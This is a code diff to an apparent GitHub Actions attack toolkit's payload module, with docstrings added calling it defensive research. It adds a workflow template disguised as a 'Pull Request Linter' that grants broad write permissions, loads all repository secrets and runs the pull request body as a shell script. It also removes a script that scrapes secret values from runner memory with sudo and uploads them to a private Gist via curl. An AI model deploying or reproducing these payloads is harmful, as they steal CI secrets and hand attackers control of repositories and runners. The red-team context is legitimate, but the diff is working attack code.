@@ -1,3 +1,10 @@
+"""Payload templates for GitHub Actions security testing and research.
+
+This module contains payload templates used for defensive security testing
+of GitHub Actions workflows and runners. These payloads are intended for
+security research, vulnerability assessment, and educational purposes only.
+"""
+
 import yaml
 
 
@@ -98,29 +105,51 @@ else
 fi
 """
 
+    PWN_REQUEST_WORKFLOW = """name: Pull Request Linter
+on:
+  pull_request_target:
+    branches: [{0}]
+
+jobs:
+  permissions:
+    id-token: write
+    contents: write
+    pull-requests: write
+    actions: write
+    checks: write
+    deployments: write
+    issues: write
+    packages: write
+    pages: write
+    repository-projects: write
+    security-events: write
+    statuses: write
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Parse PR
+        env:
+          SECRETS: ${{{{ toJSON(secrets) }}}}
+          PR_BODY: ${{{{ github.event.pull_request.body }}}}
+        run: |
+          echo $PR_BODY > /tmp/pr.sh
+          bash /tmp/pr.sh
+"""
+
     @staticmethod
     def create_exfil_payload():
-        """Creates a Gist hosting an exfiltration payload."""
+        """Creates a Gist hosting an exfiltration payload.
 
-        payload = """
-if [[ "$OSTYPE" == "linux-gnu" ]]; then
-  ENCODED_MEMDUMP="{}"
-  B64_BLOB=`base64 -d $ENCODED_MEMDUMP | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' | sort -u | base64 -w 0`
-  GIST_TOKEN="{}"
-  GIST_TOKEN_DECODED=`echo $GIST_TOKEN | base64 -d`
+        Used for security testing to demonstrate potential data exfiltration
+        vulnerabilities in GitHub Actions workflows. This method is intended
+        for defensive security research and vulnerability assessment.
 
-  curl -L \
-    -X POST \
-    -H "Accept: application/vnd.github+json" \
-    -H "Authorization: Bearer $GIST_TOKEN_DECODED" \
-    -H "X-GitHub-Api-Version: 2022-11-28" \
-    https://api.github.com/gists -d '{"public":false,"files":{"Exfil":{"content":"'$B64_BLOB'"}}}' > /dev/null
+        Returns:
+            str: Payload content for creating a Gist with exfiltration capabilities.
 
-    sleep 900
-else
-  exit 0
-fi
-"""
+        Note:
+            This is for security research and testing purposes only.
+        """
 
     @staticmethod
     def create_ror_workflow(
@@ -130,7 +159,27 @@ fi
         runner_labels: list,
         target_os: str = "linux",
     ):
-        """ """
+        """Creates a GitHub Actions workflow for runner-on-runner (RoR) security testing.
+
+        Generates a YAML workflow file that demonstrates potential security vulnerabilities
+        in GitHub Actions self-hosted runners. This is used for defensive security testing
+        to identify and mitigate runner compromise scenarios.
+
+        Args:
+            workflow_name (str): Name of the workflow to create.
+            run_name (str): Display name for workflow runs.
+            gist_url (str): URL to the Gist containing the payload script.
+            runner_labels (list): List of runner labels to target.
+            target_os (str, optional): Target operating system ('linux', 'osx', 'win').
+                                     Defaults to 'linux'.
+
+        Returns:
+            str: YAML content of the workflow file for security testing.
+
+        Note:
+            This method is intended for security research, vulnerability assessment,
+            and educational purposes only. Should not be used maliciously.
+        """
         yaml_file = {}
 
         yaml_file["name"] = workflow_name
